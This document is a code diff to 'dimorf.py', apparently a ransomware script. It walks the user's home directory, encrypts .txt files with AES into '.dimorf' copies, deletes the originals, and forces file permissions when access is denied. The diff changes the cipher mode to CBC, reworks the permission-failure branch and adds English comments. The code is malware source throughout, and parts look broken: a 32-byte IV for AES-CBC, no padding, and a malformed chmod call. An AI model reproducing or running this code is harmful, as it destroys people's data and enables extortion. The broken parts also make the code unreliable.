@@ -9,6 +9,7 @@ __module__ = 'dimorf.py'
 
 import sys
 import os
+from time import sleep
 from Crypto.Cipher import AES
 from Crypto import Random
 
@@ -16,6 +17,7 @@ from Crypto import Random
 def check_os(osname: str) -> str | None:
     USER_DIR = os.getenv('HOME')
     
+    # # check if os is linux.
     is_linux = [
         prop for prop in os.uname() if (
             (prop == "Linux")
@@ -24,7 +26,8 @@ def check_os(osname: str) -> str | None:
         )
     ]
 
-    if is_linux and sys.version[0] == '3'):
+    # # check python version before called function.
+    if ((is_linux) and (sys.version[0] == '3')):
         find_and_encrypt(
             path=USER_DIR,
             ext_files=['.txt'],
@@ -44,6 +47,7 @@ def find_and_encrypt(
     block_bytes: int
 ) -> str | bytes | list | None:
 
+    # # go in search of the file.
     for root, dirs, files in os.walk(path):
         for file in files:
             end_with_ext = [
@@ -54,12 +58,14 @@ def find_and_encrypt(
                 )
             ]
 
+            # # verify file type.
             if ((end_with_ext) and not(
                 file.startswith(
                     hidden
                 )
             )):
-                # verificando permissão
+                
+                # # checks if the user has permission on the file.
                 if (
                     os.access(
                         os.path.join(
@@ -80,22 +86,67 @@ def find_and_encrypt(
                                 file
                             ), os.R_OK
                         )
-                    )):
-
-                        # # iniciando operacoes criptograficas.
-                        init_vector = Random.new().read(32)
-                        cipher = AES.new(
-                            key,
-                            AES.MODE_EAX,
-                            init_vector
+                    )
+                ):
+                    
+                    # # beginning encrypt operations.
+                    init_vector = Random.new().read(32)
+                    cipher = AES.new(
+                        key,
+                        AES.MODE_CBC,
+                        init_vector
+                    )
+                    
+                    # # open and reads file in blocks of 65536 bytes.    
+                    with open(os.path.join(root, file), mode='rb') as f:
+                        data = f.read(
+                            block_bytes
                         )
 
+                    # # creates a new one with the same encrypted information
+                    # # and adds the modified extension ".dimorf".
+                    with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
+                        
+                        # # is it encrypted?.
+                        if (
+                            f.write(
+                                cipher.encrypt(
+                                    data
+                                )
+                            )
+                        ):
+                            # # show.
+                            print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
+                    
+                    # # remove the original file.
+                    os.remove(
+                        os.path.join(
+                            root,
+                            file
+                        )
+                    )
+
+                else:
+                    try:
+                        # # don't have? try assign.
+                        os.chmod(
+                            os.path.join(
+                                root, 
+                                file
+                            ), 0o644
+                        )
+                        
+                        # # open and reads file in blocks of 65536 bytes.    
                         with open(os.path.join(root, file), mode='rb') as f:
                             data = f.read(
                                 block_bytes
                             )
 
+                        # # creates a new one with the same encrypted information
+                        # # and adds the modified extension ".dimorf".
                         with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
+                        
+                            # # is it encrypted?.
                             if (
                                 f.write(
                                     cipher.encrypt(
@@ -103,73 +154,49 @@ def find_and_encrypt(
                                     )
                                 )
                             ):
+                                
+                                # # show.
                                 print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
-
+                    
+                        # # remove the original file.
                         os.remove(
                             os.path.join(
                                 root,
                                 file
                             )
                         )
-
-                else:
-                    if (
-                        os.chmod(
-                            os.path.join(
-                                root,
-                                file
+                    
+                    except OSError:
+                        
+                        # # don't have permission?.
+                        if not (
+                            os.chmod(
+                                os.path.join(
+                                    root, file
+                                )
                             ), 0o644
-                        )
-                    ):
+                        ):
+                            
+                            # # generates a log file with the files
+                            # # that could not be assigned permission.
+                            sleep(2)
+                            logs = [
+                                ('Erro ao alterar permissões de arquivo.\n'),
+                                (f'Arquivos => {os.path.join(root, file)}\n')
+                            ]
 
-                        try:
-                            with open(os.path.join(root, file), mode='rb') as f:
-                                data = f.read(
-                                    block_bytes
-                                )
-
-                            with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
-                                if (
-                                    f.write(
-                                        cipher.encrypt(
-                                            data
-                                        )
+                            with open('log_dimorf.log', mode='w') as lf:
+                                if lf.write(
+                                    logs[0]
+                                ):
+                                    lf.write(
+                                        logs[1]
                                     )
-                                ):      
-                                    print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
-
-                            os.remove(
-                                os.path.join(
-                                    root,
-                                    file
-                                )
-                            )
-
-                        except Exception:
-                            if not os.chmod(
-                                os.path.join(
-                                    root,
-                                    file
-                                ), 0o644
-                            ):
-                           
-                                logs = [
-                                    ('Erro ao alterar permissões de arquivo.\n'),
-                                    (f'Arquivos => {os.path.join(root, file)}\n')
-                                ]
-
-                                with open('log_dimorf.log', mode='w') as lf:
-                                    if lf.write(
-                                        logs[0]
-                                    ):
-                                        lf.write(
-                                            logs[1]
-                                       )
-                                        
-                                        print(
-                                            f'\33[32mLogs gerado em {lf}\33[0m'
-                                       )
-
-
+                                    
+                                    print(
+                                        f'\33[32mLogs gerado em {lf}\33[0m'
+                                    )
+                            
+                            
 if __name__ == '__main__':
     check_os('posix')
